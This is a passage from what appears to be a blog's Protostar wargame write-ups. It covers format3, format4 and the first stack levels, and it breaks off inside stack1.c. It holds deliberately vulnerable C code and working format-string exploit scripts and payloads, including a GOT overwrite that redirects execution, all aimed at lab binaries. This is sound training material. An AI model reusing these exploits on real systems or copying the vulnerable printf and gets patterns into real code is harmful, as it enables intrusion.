</span><span class='line'>user@protostar:~$ ruby -e 'print "DDDD %12\$p"' | /opt/protostar/bin/format3 
</span><span class='line'>DDDD 0x44444444target is 00000000 :(
</span><span class='line'>
</span><span class='line'>user@protostar:~$ nm /opt/protostar/bin/format3 | grep target
</span><span class='line'>080496f4 B target</span></code></pre></td></tr></table></div></figure>


<p>We need to rewrite the address at <code>0x080496f4</code> with the value <code>0x01025544</code>. For this purpose we prepare simple ruby script to calculate the exact format string:</p>

<figure class='code'><figcaption><span>formatter.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">check_param</span><span class="p">(</span><span class="n">fmt</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">if</span> <span class="n">fmt</span> <span class="o">=~</span> <span class="sr">/\d+:0x\h+:0x\h+/</span>
</span><span class='line'>    <span class="nb">puts</span> <span class="s2">&quot;syntax: </span><span class="si">#{</span><span class="vg">$0</span><span class="si">}</span><span class="s2"> &lt;position:target_address:shellcode_address&gt;&quot;</span>
</span><span class='line'>    <span class="nb">exit</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">fmt</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'><span class="n">check_param</span><span class="p">(</span><span class="n">fmt</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">offset</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">,</span> <span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># get high / low ordered bytes, remove 0x prefix</span>
</span><span class='line'><span class="n">hob</span> <span class="o">=</span> <span class="n">shellcode_addr</span><span class="o">[</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="o">].</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="n">lob</span> <span class="o">=</span> <span class="n">shellcode_addr</span><span class="o">[</span><span class="mi">6</span><span class="p">,</span><span class="mi">4</span><span class="o">].</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="n">addr</span> <span class="o">=</span> <span class="n">target_addr</span><span class="o">[</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="o">]</span>
</span><span class='line'><span class="n">o</span> <span class="o">=</span> <span class="n">offset</span><span class="o">.</span><span class="n">to_i</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">hob</span> <span class="o">&gt;</span> <span class="n">lob</span><span class="p">)</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="n">lob</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">hob</span> <span class="o">-</span> <span class="n">lob</span><span class="p">;</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="n">addr</span><span class="p">;</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;%08x&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="n">hob</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">lob</span> <span class="o">-</span> <span class="n">hob</span><span class="p">;</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;%08x&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">);</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="n">addr</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;ruby -e &#39;print [0x</span><span class="si">#{</span><span class="n">a</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="si">}</span><span class="s2">].pack(</span><span class="se">\&quot;</span><span class="s2">V</span><span class="se">\&quot;</span><span class="s2">) + [0x</span><span class="si">#{</span><span class="n">a</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="si">}</span><span class="s2">].pack(</span><span class="se">\&quot;</span><span class="s2">V</span><span class="se">\&quot;</span><span class="s2">) + </span><span class="se">\&quot;</span><span class="s2">%</span><span class="si">#{</span><span class="n">o</span><span class="si">}</span><span class="se">\\</span><span class="s2">$</span><span class="si">#{</span><span class="n">f</span><span class="si">}</span><span class="s2">x%</span><span class="si">#{</span><span class="n">o</span><span class="si">}</span><span class="se">\\</span><span class="s2">$hn%</span><span class="si">#{</span><span class="n">o</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="se">\\</span><span class="s2">$</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">x%</span><span class="si">#{</span><span class="n">o</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="se">\\</span><span class="s2">$hn</span><span class="se">\&quot;</span><span class="s2">&#39;&quot;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby1.9.1 ./formatter.rb 12:0x080496f4:0x01025544
</span><span class='line'>ruby -e 'print [0x080496f6].pack("V") + [0x080496f4].pack("V") + "%12\$250x%12\$hn%13\$21570x%13\$hn"'
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print [0x080496f6].pack("V") + [0x080496f4].pack("V") + "%12\$250x%12\$hn%13\$21570x%13\$hn"' | /opt/protostar/bin/format3 
</span><span class='line'>...
</span><span class='line'>80496f4you have modified the target :)</span></code></pre></td></tr></table></div></figure>


<p>The challenge could be also solved with <a href="https://github.com/hellman/libformatstr">hellman&rsquo;s libformatstr.py</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ git clone https://github.com/hellman/libformatstr
</span><span class='line'>Cloning into libformatstr...
</span><span class='line'>remote: Counting objects: 51, done.
</span><span class='line'>remote: Total 51 (delta 0), reused 0 (delta 0), pack-reused 51
</span><span class='line'>Unpacking objects: 100% (51/51), done.
</span><span class='line'>
</span><span class='line'>user@protostar:~$ cd libformatstr/</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>exploit-format3.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">libformatstr</span> <span class="kn">import</span> <span class="n">FormatStr</span>
</span><span class='line'>
</span><span class='line'><span class="n">destination</span>   <span class="o">=</span> <span class="mh">0x080496f4</span>
</span><span class='line'><span class="n">what_to_write</span> <span class="o">=</span> <span class="mh">0x01025544</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">FormatStr</span><span class="p">()</span>
</span><span class='line'><span class="n">p</span><span class="p">[</span><span class="n">destination</span><span class="p">]</span> <span class="o">=</span> <span class="n">what_to_write</span>
</span><span class='line'>
</span><span class='line'><span class="c"># buf is 12th argument, 0 bytes are already printed</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">payload</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">start_len</span><span class="o">=</span><span class="mi">0</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/libformatstr$ python ./exploit-format3.py  | /opt/protostar/bin/format3 
</span><span class='line'>...
</span><span class='line'> p??you have modified the target :)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Format4</h2>

<figure class='code'><figcaption><span>format4.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">hello</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code execution redirected! you win</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby -e 'print "DDDD" + " %p" * 25' | /opt/protostar/bin/format4
</span><span class='line'>DDDD 0x200 0xb7fd8420 0xbffff5b4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x702520 0x1000 0x1
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print "DDDD %4\$p"' | /opt/protostar/bin/format4
</span><span class='line'>DDDD 0x44444444
</span><span class='line'>
</span><span class='line'>user@protostar:~$ objdump -TR /opt/protostar/bin/format4
</span><span class='line'>
</span><span class='line'>/opt/protostar/bin/format4:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC SYMBOL TABLE:
</span><span class='line'>00000000  w   D  *UND*    00000000              __gmon_start__
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   fgets
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   __libc_start_main
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   _exit
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   printf
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   puts
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   exit
</span><span class='line'>080485ec g    DO .rodata  00000004  Base        _IO_stdin_used
</span><span class='line'>08049730 g    DO .bss 00000004  GLIBC_2.0   stdin
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE 
</span><span class='line'>080496fc R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>08049730 R_386_COPY        stdin
</span><span class='line'>0804970c R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049710 R_386_JUMP_SLOT   fgets
</span><span class='line'>08049714 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>08049718 R_386_JUMP_SLOT   _exit
</span><span class='line'>0804971c R_386_JUMP_SLOT   printf
</span><span class='line'>08049720 R_386_JUMP_SLOT   puts
</span><span class='line'>08049724 R_386_JUMP_SLOT   exit
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>user@protostar:~$ objdump -d -j .plt /opt/protostar/bin/format4 
</span><span class='line'>
</span><span class='line'>/opt/protostar/bin/format4:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .plt:
</span><span class='line'>
</span><span class='line'>0804837c &lt;__gmon_start__@plt-0x10>:
</span><span class='line'> 804837c: ff 35 04 97 04 08       pushl  0x8049704
</span><span class='line'> 8048382: ff 25 08 97 04 08       jmp    *0x8049708
</span><span class='line'> 8048388: 00 00                   add    %al,(%eax)
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>0804838c &lt;__gmon_start__@plt>:
</span><span class='line'> 804838c: ff 25 0c 97 04 08       jmp    *0x804970c
</span><span class='line'> 8048392: 68 00 00 00 00          push   $0x0
</span><span class='line'> 8048397: e9 e0 ff ff ff          jmp    804837c &lt;_init+0x30>
</span><span class='line'>
</span><span class='line'>0804839c &lt;fgets@plt>:
</span><span class='line'> 804839c: ff 25 10 97 04 08       jmp    *0x8049710
</span><span class='line'> 80483a2: 68 08 00 00 00          push   $0x8
</span><span class='line'> 80483a7: e9 d0 ff ff ff          jmp    804837c &lt;_init+0x30>
</span><span class='line'>
</span><span class='line'>080483ac &lt;__libc_start_main@plt>:
</span><span class='line'> 80483ac: ff 25 14 97 04 08       jmp    *0x8049714
</span><span class='line'> 80483b2: 68 10 00 00 00          push   $0x10
</span><span class='line'> 80483b7: e9 c0 ff ff ff          jmp    804837c &lt;_init+0x30>
</span><span class='line'>
</span><span class='line'>080483bc &lt;_exit@plt>:
</span><span class='line'> 80483bc: ff 25 18 97 04 08       jmp    *0x8049718
</span><span class='line'> 80483c2: 68 18 00 00 00          push   $0x18
</span><span class='line'> 80483c7: e9 b0 ff ff ff          jmp    804837c &lt;_init+0x30>
</span><span class='line'>
</span><span class='line'>080483cc &lt;printf@plt>:
</span><span class='line'> 80483cc: ff 25 1c 97 04 08       jmp    *0x804971c
</span><span class='line'> 80483d2: 68 20 00 00 00          push   $0x20
</span><span class='line'> 80483d7: e9 a0 ff ff ff          jmp    804837c &lt;_init+0x30>
</span><span class='line'>
</span><span class='line'>080483dc &lt;puts@plt>:
</span><span class='line'> 80483dc: ff 25 20 97 04 08       jmp    *0x8049720
</span><span class='line'> 80483e2: 68 28 00 00 00          push   $0x28
</span><span class='line'> 80483e7: e9 90 ff ff ff          jmp    804837c &lt;_init+0x30>
</span><span class='line'>
</span><span class='line'>080483ec &lt;exit@plt>:
</span><span class='line'> 80483ec: ff 25 24 97 04 08       jmp    *0x8049724
</span><span class='line'> 80483f2: 68 30 00 00 00          push   $0x30
</span><span class='line'> 80483f7: e9 80 ff ff ff          jmp    804837c &lt;_init+0x30>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>user@protostar:~$ nm /opt/protostar/bin/format4 | grep hello
</span><span class='line'>080484b4 T hello</span></code></pre></td></tr></table></div></figure>


<p>Using <code>Global Offset Table Hijacking</code> technique, we will try to overwrite the <code>0x08049724</code> address - jmp in <code>exit()</code>, with <code>0x080484b4</code> - symbol <code>hello</code>, at offset <code>4</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby1.9.1 ./formatter.rb 4:0x08049724:0x080484b4
</span><span class='line'>ruby -e 'print [0x08049726].pack("V") + [0x08049724].pack("V") + "%4\$2044x%4\$hn%5\$31920x%5\$hn"'
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'print [0x08049726].pack("V") + [0x08049724].pack("V") + "%4\$2044x%4\$hn%5\$31920x%5\$hn"' | /opt/protostar/bin/format4 
</span><span class='line'>...
</span><span class='line'>8049724code execution redirected! you win</span></code></pre></td></tr></table></div></figure>


<p>Correspondingly:</p>

<figure class='code'><figcaption><span>exploit-format4.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">libformatstr</span> <span class="kn">import</span> <span class="n">FormatStr</span>
</span><span class='line'>
</span><span class='line'><span class="n">destination</span>   <span class="o">=</span> <span class="mh">0x08049724</span>
</span><span class='line'><span class="n">what_to_write</span> <span class="o">=</span> <span class="mh">0x080484b4</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">FormatStr</span><span class="p">()</span>
</span><span class='line'><span class="n">p</span><span class="p">[</span><span class="n">destination</span><span class="p">]</span> <span class="o">=</span> <span class="n">what_to_write</span>
</span><span class='line'>
</span><span class='line'><span class="c"># buf is 4th argument, 0 bytes are already printed</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">payload</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">start_len</span><span class="o">=</span><span class="mi">0</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ libformatstr/exploit-format4.py | /opt/protostar/bin/format4 
</span><span class='line'>...
</span><span class='line'>AAA&$code execution redirected! you win</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Stack Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels/"/>
    <updated>2015-06-27T09:46:35+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt --no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack0</h2>

<figure class='code'><figcaption><span>stack0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "\xfa" * 64' | ./stack0 
</span><span class='line'>Try again?
</span><span class='line'>
</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "\xfa" * 64 + "\x01"' | ./stack0 
</span><span class='line'>you have changed the 'modified' variable</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Stack1</h2>

<figure class='code'><figcaption><span>stack1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
